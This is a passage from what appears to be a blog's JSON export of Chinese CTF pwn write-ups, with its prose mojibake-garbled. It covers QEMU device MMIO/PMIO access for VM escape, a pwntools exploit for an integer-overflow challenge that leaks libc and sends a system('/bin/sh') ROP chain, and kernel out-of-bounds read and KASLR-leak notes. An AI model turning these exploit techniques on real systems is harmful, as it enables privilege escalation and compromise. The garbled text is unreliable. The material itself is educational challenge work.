value;\n```\n\nå¯¹mmioå’Œpmioç©ºé—´çš„æ“ä½œå‡½æ•°å°±ä¼šæ‰§è¡Œ.readå’Œ.writeå‡½æ•°ï¼Œä½†æ˜¯ç»“æ„ä½“ç”±äºé‡æ–°å°†.readå‡½æ•°å’Œ.writeå®šä½æˆäº†strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ï¼Œè¿™ä¸ªæ“ä½œæŸç§ç¨‹åº¦ä¸Šç›¸å½“äºä¿®æ”¹äº†ä¸¤ä¸ªå‡½æ•°çš„gotè¡¨ã€‚ä¹‹åå°±ç›¸å½“äºæ­£å¸¸çš„pwné¢˜äº†ï¼Œå°±æ˜¯åˆ©ç”¨è¿™å‡ ä¸ªè¯»å†™å‡½æ•°ä¸­çš„æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡Œsystem(\"cat /root/flag.txt\")å³å¯ã€‚\n\n \n\nä¸‰ã€è°ƒç”¨mmio_readå’Œmmio_writeå‡½æ•°\n\nåœ¨strngä¸­ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ã€‚\n\n1.å¯¹mmioç©ºé—´æ“ä½œï¼Œè¿›è€Œè°ƒç”¨strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ï¼š\n\næ­£å¸¸å†™cè¯­è¨€çš„expç¼–è¯‘ä¹‹åï¼Œæ”¾åˆ°qemuä¸­è¿è¡Œï¼Œå°±èƒ½é€šè¿‡PCIè®¾å¤‡å·ä»è€Œå¾—åˆ°mmioåœ°å€ï¼š/sys/devices/pci0000:00/0000:00:04.0/resource0ã€‚ç„¶åé€šè¿‡è¯¥åœ°å€å’Œç‰¹å®šå‡½æ•°å°±èƒ½è®¿é—®åˆ°mmioç©ºé—´ï¼Œè·³å‡ºqemuåˆ°ä¸»æœºçš„mmioç©ºé—´ã€‚\n\nâ‘ ç”¨æˆ·æ€è®¿é—®ï¼Œæ­£å¸¸pwné¢˜ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n#include <assert.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include<sys/io.h>\n\nunsigned char* mmio_mem;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\n\nint main(int argc, char *argv[])\n{\n\n    // Open and map I/O memory for the strng device\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource0\", O_RDWR | O_SYNC);//è¿™é‡Œéœ€è¦è·å–åˆ°mmioçš„åœ°å€\n    if (mmio_fd == -1)\n        die(\"mmio_fd open failed\");\n\n    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if (mmio_mem == MAP_FAILED)\n        die(\"mmap mmio_mem failed\");\n\n    printf(\"mmio_mem @ %p\\n\", mmio_mem);\n\n    mmio_read(0x128);\n    mmio_write(0x128, 1337);\n\n}\n```\n\nâ‘¡å†…æ ¸æ€è®¿é—®ï¼šä¸å¤ªçŸ¥é“æœ‰å•¥ç”¨\n\n```\n//æ³¨é‡Šå¤´\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\nlong addr=ioremap(ioaddr,iomemsize);\nreadb(addr);\nreadw(addr);\nreadl(addr);\nreadq(addr);//qwords=8 btyes\n\nwriteb(val,addr);\nwritew(val,addr);\nwritel(val,addr);\nwriteq(val,addr);\niounmap(addr);\n```\n\n2.å¯¹pmioç©ºé—´æ“ä½œï¼Œè¿›è€Œè°ƒç”¨strng_pmio_readå’Œstrng_pmio_writeå‡½æ•°ï¼š\n\nâ‘ ç”¨æˆ·æ€è®¿é—®ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n#include <sys/io.h >\n\niopl(3);//éœ€è¦å…ˆç”³è¯·è®¿é—®ç«¯å£\ninb(port);\ninw(port);\ninl(port);\n\noutb(val,port);\noutw(val,port);\noutl(val,port);\n```\n\nâ‘¡å†…æ ¸æ€è®¿é—®ï¼šä¹Ÿä¸å¤ªæ¸…æ¥šæœ‰å•¥ç”¨\n\n```\n//æ³¨é‡Šå¤´\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\ninb(port); //è¯»å–ä¸€å­—èŠ‚\ninw(port); //è¯»å–ä¸¤å­—èŠ‚\ninl(port); //è¯»å–å››å­—èŠ‚\n\noutb(val,port); //å†™ä¸€å­—èŠ‚\noutw(val,port); //å†™ä¸¤å­—èŠ‚\noutl(val,port); //å†™å››å­—èŠ‚\n```\n\n3.ç„¶åå°±èƒ½è°ƒç”¨åˆ°qemuä¸­å…³äºmmioå’Œpmioçš„readï¼Œwriteå‡½æ•°äº†ï¼Œä»è€ŒæŒ–æ˜æ¼æ´ï¼Œè·³å‡ºqemuã€‚\n\n \n\n \n","tags":["qemué¢˜"],"categories":["QEMU"]},{"title":"shadow-IntergerOverflow-Nice","url":"/2021/08/14/shadow-IntergerOverflow-Nice/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†NXï¼ŒFULL RELROï¼ŒCanaryï¼Œæ²¡åŠæ³•shellcodeï¼Œä¿®æ”¹gotè¡¨ã€‚ç„¶åIDAæ‰“å¼€æ‰¾æ¼æ´ï¼š\n\n(1)æ•´æ•°è½¬æ¢æ¼æ´ï¼š\n\nè¾“å…¥message_lengthä¹‹åå°†é•¿åº¦è¿”å›è¿›è¡Œatoiï¼Œå°†atoiçš„è¿”å›å€¼ç»™åˆ°ä¸‹ä¸€ä¸ªè¾“å…¥messageçš„getlineã€‚ä¸­é—´ç”¨atoiè¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬intçš„æ“ä½œï¼Œè€Œatoiæ˜¯ä¸€ä¸ªå°†æ•°å­—å‹å­—ç¬¦ä¸²è½¬æˆæ•°å­—çš„å‡½æ•°ï¼Œâ€-1â€å¯ä»¥è½¬æ¢ä¸º-1ã€‚ä½†æ˜¯getlineä¸­readçš„é•¿åº¦å‚æ•°æ˜¯size_tï¼Œç›¸å½“äºæ˜¯unsigned intï¼Œæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•°ã€‚\n\nâ–²è€Œintçš„è¡¨è¾¾æ–¹å¼æ˜¯ï¼š0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff)\n\nunsignedçš„è¡¨è¾¾æ–¹å¼æ˜¯ï¼š0~4294967295(0~0xffffffff)\n\né‚£ä¹ˆintçš„-1è½¬æ¢æˆunsignedä¹‹åå°±ä¼šå˜æˆ0xffffffffï¼Œä»è€Œæº¢å‡ºã€‚\n\nâ–²ç”±äºç¨‹åºå®ç°äº†è‡ªå®šä¹‰çš„popï¼Œpushï¼Œretï¼Œcallç­‰å‡ ä¸ªæ§åˆ¶æ ˆå¸§çš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ¼æ´ä¸å¤ªå¥½æ‰¾ï¼Œæ±‡ç¼–ä¸å¤ªå¥½çš„åªèƒ½å…ˆæ…¢æ…¢è°ƒè¯•éªŒè¯çŒœæƒ³æ˜¯å¦æ­£ç¡®ã€‚\n\n(2)æ ˆæº¢å‡ºï¼šæ ˆæº¢å‡ºæ˜¯ä»æ•´æ•°è½¬æ¢æ¼æ´ä¸­æ¥çš„ï¼Œç”±äºmessageæ˜¯ä¿å­˜åœ¨messageå‡½æ•°æ ˆä¸Šçš„ï¼Œæ‰€ä»¥å°±å¦‚æœå°†readçš„é•¿åº¦å‚æ•°å˜å¾—å¾ˆå¤§ï¼Œå°±å¯ä»¥æ ˆæº¢å‡ºã€‚\n\nâ–²è¿™é‡Œçš„æ ˆæº¢å‡ºå’Œå¹³å¸¸æ ˆæº¢å‡ºæœ‰ç‚¹ä¸åŒï¼Œè€Œä¸”è¿˜å¼€äº†canaryï¼Œç…§ç†è¯´è¿™ä¸ªæ ˆæº¢å‡ºæ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯è¿™é‡Œçš„Messageæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œåªè¦messageå‡½æ•°ä¸é€€å‡ºï¼Œé‚£ä¹ˆå°±ä¸ä¼šè§¦å‘canaryçš„æ£€æŸ¥ï¼Œå°±ç®—æ ˆæº¢å‡ºäº†ï¼Œé‚£ä¹Ÿå¾—ç­‰åˆ°messageå‡½æ•°é€€å‡ºç¨‹åºæ‰ä¼šå´©æºƒã€‚\n\n2.ç°åœ¨åªæœ‰ä¸¤ä¸ªæ¼æ´ï¼Œä½†æ˜¯çœ‹ç¨‹åºF5å¤§æ³•å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œçœ‹æ±‡ç¼–å§ï¼š\n\n(1)è¾“å…¥nameçš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528530.jpeg)\n\n(2)è¾“å…¥é•¿åº¦çš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528677.jpeg)\n\n(3)è¾“å…¥messageçš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528431.jpeg)\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥messageå’Œnameçš„getlineä¸­ä¿å­˜æ•°æ®çš„å‚æ•°ä¸ä¸€æ ·ï¼Œ\n\nä¿å­˜nameçš„å‚æ•°æ˜¯ï¼š[ebp+arg_0]\n\nä¿å­˜messageçš„å‚æ•°æ˜¯ï¼š[ebp+var-2c]\n\nå†çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‚æ•°çš„å®šä¹‰ï¼š\n\narg_0 = dword ptr  8\n\nvar_2C = byte ptr -2Ch\n\nå¯ä»¥çœ‹åˆ°nameä¿å­˜åœ¨ebpçš„ä¸‹æ–¹ï¼Œä¸åœ¨messageçš„å‡½æ•°æ ˆï¼Œä½†æ˜¯messageä¿å­˜åœ¨ebpä¸Šæ–¹ï¼Œåœ¨messageå‡½æ•°æ ˆä¸­ã€‚\n\n3.é‚£ä¹ˆç°åœ¨æ€è€ƒä¸‹æ”»å‡»æ€è·¯ã€‚å…ˆè¾“å…¥-1æ‰§è¡Œæ ˆæº¢å‡ºæ¼æ´ï¼Œå°†messageå‡½æ•°æ ˆä¸‹æ–¹çš„ä¿å­˜nameçš„å†…å®¹æ›´æ”¹ä¸ºæŸå‡½æ•°çš„gotè¡¨ï¼Œè¿™æ ·åœ¨æ‰“å°nameæ—¶å°±å¯ä»¥å°†è¯¥å‡½æ•°æ‰“å°å‡ºæ¥ã€‚\n\n(è¿™é‡Œèƒ½æ‰“å°çš„åŸå› æ˜¯printfçš„ä¼ å‚å…³ç³»ï¼Œè¿™é‡Œèƒ½çœ‹åˆ°ï¼Œnameå’Œmessageä¼ å‚æ‰€ç”¨æŒ‡ä»¤ä¸åŒï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528201.jpeg)\n\nnameæ˜¯movæŒ‡ä»¤ï¼Œæ˜¯ç›´æ¥å°†ebp+arg_0ä¸Šçš„å†…å®¹ä¼ ç»™eax\n\nmessageæ˜¯leaæŒ‡ä»¤ï¼Œæ˜¯å°†ebp+var_2cè¿™ä¸ªæ ˆåœ°å€ä¼ ç»™edx\n\né‚£ä¹ˆæ˜¾è€Œæ˜“è§ï¼Œebp+arg_0ä¸Šä¿å­˜çš„è‚¯å®šæ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œè¿™ä¸ªæ ˆåœ°å€ä¸Šçš„å†…å®¹æ‰æ˜¯nameçš„çœŸå®å†…å®¹ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦†ç›–ebp+arg_0ä¸Šçš„å†…å®¹ä¸ºgotè¡¨ï¼Œé‚£ä¹ˆå†æ‰“å°å°±æ˜¯å–gotè¡¨ä¸­çš„å†…å®¹æ‰“å°ï¼Œä¹Ÿæ˜¯å‡½æ•°çœŸå®åœ°å€ã€‚)\n\nä»è€Œæ³„éœ²å‡ºlibcåŸºåœ°å€ã€‚ä¹‹åå†æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºROPé“¾æ¥getshellã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºç¨‹åºè‡ªå®šäº†æŸäº›æ±‡ç¼–å‡½æ•°ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ç”¨ç¨‹åºçš„callæ¥è°ƒç”¨çš„å‡½æ•°ï¼Œè¿”å›åœ°å€ä¸å†æ˜¯åŸæ¥callå‡½æ•°çš„ä¸‹ä¸€å¥ä»£ç ï¼Œè€Œæ˜¯ä¸€ä¸ªrestore_eipå‡½æ•°ã€‚å› ä¸ºåœ¨leaveå’ŒretæŒ‡ä»¤æ‰§è¡Œå‰ï¼Œæ‰§è¡Œäº†call retï¼Œä¿®æ”¹äº†æŸäº›ä¸œè¥¿ï¼Œå¯¼è‡´åŸæœ¬ebpä¸‹é¢ä¸å†æ˜¯å‡½æ•°çš„è¿”å›åœ°å€äº†ã€‚å¹¶ä¸”ç”±äºæ˜¯ä¼ æŒ‡é’ˆï¼Œå°±ç®—æ ˆæº¢å‡ºï¼Œæº¢å‡ºçš„ä¹Ÿåªèƒ½æ˜¯messageå‡½æ•°æ ˆï¼Œé‚£æœ‰canaryçš„æƒ…å†µä¸‹ï¼Œæº¢å‡ºä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ã€‚ä½†æ˜¯å…¶å®ƒå‡½æ•°è¿”å›åœ°å€åˆ™æ˜¯ç›´æ¥è·³è½¬åˆ°ret_stubå‡½æ•°ï¼Œè€Œè¿™ä¸ªret_stubå‡½æ•°æ˜¯ä¿å­˜åœ¨æ ˆä¸Šçš„ã€‚\n\n4.è¿™é‡Œå°±æƒ³åˆ°printfå‡½æ•°ï¼Œç”±äºnameä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå°†nameæ€»å…±16å­—èŠ‚é¡¶æ»¡åä¼šè¿ä¸Šä¸€ä¸ª17F79D79ï¼Œä¹‹åæ˜¯ä¸¤ä¸ªretnçš„åœ°å€ï¼Œå†ä¹‹åå°±æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œè¿™å‡ ä¸ªæ•°æ®éƒ½æ²¡æœ‰\\x00ç»“æŸå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥è¢«printfè¿åœ¨ä¸€èµ·æ‰“å°å‡ºæ¥ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528071.jpeg)\n\né‚£ä¹ˆå¯ä»¥è€ƒè™‘å°†nameé¡¶æ»¡åè¿ä¸Šebpæ³„éœ²å‡ºæ ˆåœ°å€ï¼Œä¹‹åæ‰¾åˆ°ä¿å­˜readè¿”å›åœ°å€çš„æ ˆåœ°å€ï¼Œå°†å†™å…¥nameçš„æ ˆåœ°å€æ›´æ”¹ä¸ºä¿å­˜readè¿”å›åœ°å€çš„æ ˆåœ°å€ã€‚ä¹‹åæˆ‘ä»¬å†å¾€nameä¸­å†™ä¸œè¥¿ï¼Œå°±ç›¸å½“äºè¦†ç›–readå‡½æ•°çš„è¿”å›åœ°å€ã€‚å†ç»è¿‡åå¤è°ƒè¯•ï¼Œå‘ç°readå‡½æ•°è¿”å›åœ°å€å–ç”¨çš„åœ°æ–¹åˆšå¥½æ˜¯FFF25c3c-0x100ï¼Œè€Œä¸”æ¯æ¬¡éƒ½æ˜¯é‚£ä¸ªåœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¦†ç›–äº†ã€‚(è¿™é‡Œåˆ©ç”¨è¾“å…¥messageè¿ä¸Šebpä¹Ÿå¯ä»¥æ³„éœ²å‡ºmessageçš„ebpä¸Šä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿæ˜¯ç›¸åŒçš„æ ˆåœ°å€ï¼Œè°ƒè¯•å‡ºæ¥çš„)\n\n5.ç°åœ¨å°±å°è¯•ç¼–å†™exp:\n\n(1)é¦–å…ˆä¸‰ä¸ªå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef setName(name):\nio.sendafter('Input name :',name)\n\ndef setMessage(message):\nio.sendlineafter('Message length :','-1')\nio.sendafter('Input message :',message)\n\ndef changeName(c):\nio.sendlineafter('Change name?',c)\n```\n\n(2)é€šè¿‡å¡«æ»¡nameï¼Œæ³„éœ²ä¸€ä¸ªæ ˆåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsetName('A'*0x10)\nsetMessage('BBBBBBBBBB')\nsh.recvuntil('<')\nsh.recv(0x1C)\nstack_addr = u32(sh.recv(4))\nchangeName('n')\nlog.info(\"stack_addr:%x\"%stack_addr)\n```\n\n(3)æ³„éœ²å‡½æ•°çœŸå®åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)\n#è¿™é‡Œç¬¬ä¸€ä¸ªp32(0x100)æ˜¯è¦†ç›–getlineçš„è¯»å–é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯arg_4ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸ºäº†è¦†ç›–å¾ªç¯æ¬¡æ•°ï¼Œä¹Ÿå°±æ˜¯arg_8\nsetMessage(payload)\nsh.recvuntil('<')\natoi_addr = u32(sh.recv(4))\nlog.info(\"atoi_addr:%x\"%atoi_addr)\n```\n\nè·å–nameçš„é•¿åº¦ï¼šå½“ç„¶è¿™æ”¹æ‰çš„æ˜¯nameçš„é•¿åº¦ï¼Œmessageçš„é•¿åº¦ä¿å­˜åœ¨[ebp+var_30]ä¸Šï¼Œå¹¶ä¸”å› ä¸º-1å·²ç»è¢«æ›´æ”¹ä¸º0xffffffffï¼Œè¶³å¤Ÿå¤§äº†ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191529313.jpeg)\n\nåˆ¤æ–­å¾ªç¯æ¬¡æ•°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528168.jpeg)\n\n(4)è®¡ç®—å¾—åˆ°libcä¸­å…¶å®ƒåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlibc = LibcSearcher('atoi',atoi_addr)\nlibc_base = atoi_addr - libc.dump('atoi')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n```\n\n(5)å°†å†™å…¥nameçš„åœ°æ–¹è¦†ç›–æˆè¯»å–readå‡½æ•°è¿”å›åœ°å€çš„åœ°æ–¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = 'a'*0x34 + p32(target_addr)\nsetMessage(payload)\n```\n\n(6)å†æ¬¡è¯»å–nameçš„æ—¶å€™å°±å¯ä»¥å‘é€ropé“¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nrop = p32(system_addr) + p32(0) + p32(binsh_addr)\nsetName(rop)\n```\n\n(7)æœ€ågetshell:\n\nâ–²è¿™ä¸ªexpåœ¨ä¸åŒçš„glibcç‰ˆæœ¬ä¸‹ä¸å¤ªä¸€æ ·ï¼Œ2.23/2.24/2.27éƒ½èƒ½è·‘é€šï¼Œä½†æ˜¯åœ¨2.31/2.32ç‰ˆæœ¬ä¸‹æ²¡åŠæ³•è·‘é€šï¼Œå°¤å…¶æ˜¯2.31ï¼Œè¿æ ˆåœ°å€éƒ½æ²¡åŠæ³•æ³„éœ²ã€‚2.32åˆ™æ˜¯åœ¨æœ€åä¸€æ­¥ä¼šå¤±è´¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚å¯èƒ½æ˜¯canaryçš„åŸå› ï¼Œä¸åŒç‰ˆæœ¬çš„canaryæ£€æŸ¥æœºåˆ¶å¥½åƒä¸ä¸€æ ·ã€‚\n","tags":["æ•´æ•°æ¼æ´"],"categories":["PWN","æ•´æ•°æ¼æ´0xb"]},{"title":"starctf2019-hackme","url":"/2021/08/14/starctf2019-hackme/","content":"\n1.é¦–å…ˆè§£åŒ…ï¼Œçœ‹initï¼Œç©ºçš„ã€‚\n\n2.ç„¶åçœ‹å¯åŠ¨è„šæœ¬ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 256M \\\n-nographic \\\n-kernel bzImage \\\n-append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \\\n-monitor /dev/null \\\n-initrd initramfs.cpio \\\n-smp cores=4,threads=2 \\\n-gdb tcp::1234 \\\n-cpu qemu64,smep,smap 2>/dev/null\n```\n\næ¯”è¾ƒæ­£å¸¸ï¼Œå¼€äº†smepå’Œsmapï¼Œå¹¶ä¸”4å†…æ ¸ï¼Œ2çº¿ç¨‹ï¼Œè¿™é‡Œå°±å¯èƒ½ä¼šæ˜¯æ¡ä»¶ç«äº‰çš„è€ƒç‚¹ã€‚\n\n3.ç„¶åæ‹–å…¥IDAåˆ†æï¼šç¨‹åºæ¯”è¾ƒæ£€æŸ¥ï¼Œç±»ä¼¼èœå•é¢˜ï¼Œä½†æ˜¯IDAä¸­F5çœ‹ä¼ªä»£ç ä¸­å¤šäº†å¾ˆå¤šçš„å¥‡æ€ªçš„å‚æ•°ï¼Œæœ€å¥½ä»¥add->delete->edit->readçš„é¡ºåºæ¥çœ‹æ¯”è¾ƒèˆ’æœï¼Œä¸€èˆ¬çš„å †ä½“åˆ†æç»“æ„ä¹Ÿå·®ä¸å¤šæ€ä¹ˆçœ‹ã€‚\n\né¦–å…ˆåˆ¤æ–­ä¸‹ç»“æ„ä½“ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndataStruct:\nidx       4byte\npadding   4byte\ndata_ptr  8byte\ndata_size 8byte\noffset    8byte\n\nstruct chunkNote:\nchunk_addr 8byte\nchunk_size 8byte\n```\n\nå…¶ä¸­poolä¸­å­˜å‚¨å¤šä¸ªchunkNoteç»“æ„ä½“ï¼Œä¸æ˜¯æŒ‡é’ˆï¼Œè€Œæ˜¯ç»“æ„ä½“ã€‚\n\n(1)addï¼šæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œåˆ›å»ºå †å—ï¼Œæ‹·è´æ•°æ®ï¼Œå­˜å‚¨chunkåˆ°poolä¸­\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-31-32.png)\n\n(2)deleteï¼šä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œé‡Šæ”¾å†…å­˜ï¼ŒæŒ‡é’ˆç½®ç©ºã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-36-01.png)\n\n(3)editï¼šæœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œåˆ¤æ–­äº†chunkæŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”offset+sizeè¦å°äºç­‰äºä¹‹å‰ä¿å­˜çš„sizeã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-42-06.png)\n\næœ¬æ¥æ²¡å•¥ï¼Œä½†æ˜¯è¿™é‡Œoffsetå’Œsizeæ˜¯intç±»å‹ï¼Œå¯ä»¥ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¾æ®chunk_addræ¥å‘ä¸Šä¿®æ”¹æ•°æ®äº†ï¼Œç›¸å½“äºè¶Šç•Œå†™ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-45-07.png)\n\n(4)readï¼šåŒæ ·çš„ï¼Œä¹Ÿç›¸å½“äºè¶Šç•Œè¯»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-46-46.png)\n\nâ–²è™½è¯´æ˜¯è¶Šç•Œå†™å’Œè¶Šç•Œè¯»ï¼Œä½†æ˜¯ç”±äºcopyç³»åˆ—å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¾€é«˜åœ°å€è¯»å†™çš„è¯ï¼Œ(å†…æ ¸ç³»åˆ—å‡½æ•°éƒ½åœ¨é«˜åœ°å€)offsetä¸€å®šéœ€è¦å¾ˆå¤§ï¼Œç„¶ååˆè¦æ»¡è¶³å°äºsizeï¼Œé‚£ä¹ˆuserDataSizeåŠ¿å¿…è¦è®¾ç½®ä¸ºè´Ÿæ•°ï¼Œè´Ÿæ•°è½¬æ¢æˆunsigned longå°±ä¼šå˜å¾—å¾ˆå¤§ï¼ŒåŸºæœ¬å°±ä¼šå¯¼è‡´ä¸€åŠçš„ç©ºé—´è¢«è¦†ç›–ï¼Œé‚£ä¹ˆç¨‹åºæŒ‡å®šå´©ç›˜ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯ç”³è¯·poolå…¨å±€å˜é‡å¤„æ¥è¿›è¡Œä»»æ„è¯»å†™æ¯”è¾ƒå¥½ã€‚\n\nå¦å¤–ä¹Ÿç”±äºslubçš„ç‰¹æ€§ï¼Œç®€å•ä¿®æ”¹fdçš„è¯ï¼Œè™½ç„¶èƒ½å¤Ÿä»»æ„ç”³è¯·ï¼Œä½†æ˜¯å¦‚æœfdçš„å†…å­˜å¤„ä¿å­˜çš„å†…å®¹æ˜¯ä¸ªéæ³•çš„ï¼Œå†æ¬¡ç”³è¯·è¯¥å¤§å°çš„chunkç¨‹åºå°±ä¼šå´©ï¼Œæ‰€ä»¥æœ‰å…¨å±€å˜é‡poolå°±ç”¨poolã€‚\n\n4.æ€è€ƒä¸€ä¸‹æ¼æ´æ€ä¹ˆåˆ©ç”¨ã€‚\n\n(1)é¦–å…ˆéœ€è¦åœ°å€\n\nâ‘ å †åœ°å€ï¼šé‡Šæ”¾chunkAï¼Œä»chunkBå‘ä¸Šåç§»è¯»å–chunkAçš„fdï¼Œå³å¯å¾—åˆ°æŒ‡å‘çš„chunkCçš„åœ°å€ï¼Œå³chunkA.fd = chunkA_addr+size*2ã€‚\n\nâ‘¡å†…æ ¸åŸºåœ°å€ï¼šä¾æ®ä»»æ„è¯»ï¼Œä»ç¬¬ä¸€ä¸ªchunkå¾€ä¸Šçš„åœ°æ–¹è¯»å–chunkä¸­çš„å†…å®¹ï¼Œä»ä¸­ç­›é€‰å‡ºvmlinuxä¸­çš„åœ°å€ï¼Œè¯»å–ä¹‹åå‡å»åç§»ï¼Œå³å¯å¾—åˆ°å†…æ ¸åŸºåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-45-28.png)\n\nä¾‹å¦‚è¿™é‡Œå°±å¯ä»¥è¯»å–å›¾ä¸­çš„0xffffffff81849ae0ï¼Œç„¶åå‡å»0x849ae0å³å¯å¾—åˆ°åŸºåœ°å€ã€‚å½“ç„¶è¿™æ²¡æœ‰ç”¨kalsrçš„æ•ˆæœã€‚å¼€äº†ä¹‹åå¦‚ä¸‹ï¼Œåç§»ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-51-59.png)\n\nå¾—åˆ°è¿™æ¬¡æ‰“å¼€çš„åŸºåœ°å€ï¼š0xffffffff9de00000ï¼Œç”¨å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-59-38.png)\n\nå¯ä»¥çœ‹åˆ°æœ€å‰é¢çš„å°±æ˜¯å†…æ ¸åŸºåœ°å€ã€‚\n\nâ‘¢å‡½æ•°åŸºåœ°å€ï¼š\n\ncat /proc/kallsyms|grep commit_creds\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_18-12-56.png)\n\nä»kallsymsä¸­å¯ä»¥æŸ¥çœ‹åˆ°æ‰€æœ‰å‡½æ•°ï¼Œå‡å»åŸå§‹åŸºåœ°å€0xFFFFFFFF81000000å†åŠ ä¸ŠéšæœºåŒ–çš„å†…æ ¸åŸºåœ°å€å°±æ˜¯éšæœºåŒ–ä¹‹åçš„å‡½æ•°åœ°å€äº†ã€‚æ¯”å¦‚ä¸Šä¾‹ä¸ºï¼š\n\n0xffffffff8104d220-0xFFFFFFFF81000000+0xffffffff9de00000=0xffffffff9de4d220\n\nå¾—åˆ°è¿è¡Œäº†kaslrçš„å‡½æ•°åœ°å€ã€‚\n\nâ‘£æ¨¡å—åŸºåœ°å€ï¼šç”±äºéœ€è¦poolå˜é‡åœ°å€ï¼Œæ‰€ä»¥æ¨¡å—çš„åŸºåœ°å€è‚¯å®šä¹Ÿéœ€è¦ï¼Œè¿™é‡Œåˆ©ç”¨mod_treeæ¥è·å–ã€‚mod_treeåŒ…å«äº†æ‰€æœ‰è£…è½½çš„Modçš„åŸºåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-16.png